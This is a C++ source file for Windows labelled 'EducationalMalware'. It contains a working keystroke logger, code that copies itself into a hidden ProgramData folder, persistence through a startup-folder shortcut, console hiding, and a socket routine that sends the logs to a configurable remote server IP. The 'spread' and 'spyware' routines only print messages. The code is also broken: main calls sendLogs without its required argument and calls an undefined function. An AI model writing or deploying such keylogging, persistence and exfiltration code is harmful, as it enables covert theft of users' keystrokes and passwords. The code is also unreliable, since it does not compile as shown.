#include <iostream>
#include <windows.h>
#include <initguid.h> // Important: Ensures GUIDs are defined
#include <objbase.h>
#include <shlobj.h> // For startup shortcut
#include <fstream>
#include <conio.h> // For keylogging
#include <thread>  // For background execution
#include <vector>
#include <winsock2.h>
#include <ctime>
#include <chrono>

#pragma comment(lib, "ws2_32.lib")

// MinGW being irritating
DEFINE_GUID(IID_IPersistFile,
            0x0000010B, 0x0000, 0x0000,
            0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46);
// Paths
std::string exeName = "EducationalMalware.exe";
std::string hiddenDir = "C:\\ProgramData\\EducationalMalware\\";
std::string hiddenExePath = hiddenDir + "Hidden.exe";
std::string startupShortcutName = "EducationalMalware";

#define CLIENT_IP "localhost" // Change this to the client's actual IP
#define CLIENT_PORT 22        // Change this to the port where Ncat is listening

std::string getCurrentTime()
{
    time_t now = time(0);
    struct tm tstruct;
    char buffer[80];
    tstruct = *localtime(&now);
    strftime(buffer, sizeof(buffer), "%H:%M", &tstruct);
    return std::string(buffer);
}

// Send log to server
void sendLogs(const std::string &logContent)
{
    WSADATA wsa;
    SOCKET s;
    struct sockaddr_in server;

    WSAStartup(MAKEWORD(2, 2), &wsa);
    s = socket(AF_INET, SOCK_STREAM, 0);

    server.sin_addr.s_addr = inet_addr("127.0.0.1"); // Replace with server IP
    server.sin_family = AF_INET;
    server.sin_port = htons(22);
    if (connect(s, (struct sockaddr *)&server, sizeof(server)) == 0)
    {
        send(s, logContent.c_str(), logContent.length(), 0);
        std::cout << "Log sent to server.\n";
    }
    else
    {
        std::cerr << "Failed to send log to server.\n";
    }

    closesocket(s);
    WSACleanup();
}

// Function to simulate keylogging
void logKeys()
{
    std::ofstream logFile("keylog.txt", std::ios::app);
    char c;

    while (true)
    {
        for (c = 8; c <= 255; c++)
        {
            if (GetAsyncKeyState(c) & 0x8000)
            {
                logFile << c;
                logFile.flush();
            }
        }
    }
}

// Function to add program to startup
void addToStartup(const std::string &exePath)
{
    char startupPath[MAX_PATH];
    if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startupPath)))
    {
        std::string shortcutPath = std::string(startupPath) + "\\" + startupShortcutName + ".lnk";

        CoInitialize(NULL);
        IShellLink *shellLink = NULL;
        if (SUCCEEDED(CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (void **)&shellLink)))
        {
            shellLink->SetPath(exePath.c_str());
            shellLink->SetDescription("Educational Malware Simulation");

            IPersistFile *persistFile = NULL;
            if (SUCCEEDED(shellLink->QueryInterface(IID_IPersistFile, (void **)&persistFile)))
            {
                WCHAR widePath[MAX_PATH];
                MultiByteToWideChar(CP_ACP, 0, shortcutPath.c_str(), -1, widePath, MAX_PATH);
                persistFile->Save(widePath, TRUE);
                persistFile->Release();
                std::cout << "[INFO] Persistence added: This program will start on boot.\n";
            }
            shellLink->Release();
        }
        CoUninitialize();
    }
}

// Function to move and hide the file
void hideFile()
{
    CreateDirectory(hiddenDir.c_str(), NULL);
    if (MoveFile(exeName.c_str(), hiddenExePath.c_str()))
    {
        std::cout << "[INFO] File moved to hidden directory: " << hiddenExePath << "\n";
        SetFileAttributes(hiddenExePath.c_str(), FILE_ATTRIBUTE_HIDDEN);
    }
    else
    {
        std::cerr << "[WARNING] Failed to move file. Admin rights may be required.\n";
    }
}

// Function to simulate network spreading (fake)
void simulateNetworkSpread()
{
    std::cout << "[INFO] Attempting to spread across the network...\n";
    Sleep(2000);
    std::cout << "[WARNING] Just kidding! This is only a demonstration.\n";
}

// Function to simulate spyware behavior
void simulateSpywareWarning()
{
    std::cout << "[WARNING] Real malware could now access your webcam and microphone.\n";
    std::cout << "[INFO] Always check app permissions.\n";
}

// Function to run in background
void runInBackground()
{
    FreeConsole(); // Hides console window
}

// Main function
int main()
{
    std::string targetTime = "23:59"; // Time to send logs
    std::string lastCheckedTime = "";

    std::cout << "[INFO] Server running. Logs will be sent at " << targetTime << ".\n";

    while (true)
    {
        std::string currentTime = getCurrentTime();

        // Send logs only at the target time, once per day
        if (currentTime == targetTime && lastCheckedTime != targetTime)
        {
            sendLogs();
            lastCheckedTime = targetTime; // Prevents duplicate sending
        }

        // Run other necessary processes here
        runOtherProcesses(); // Replace with actual functions you need

        // Light delay without blocking execution
        for (volatile int i = 0; i < 1000000; i++)
            ;
    }

    return 0;
}
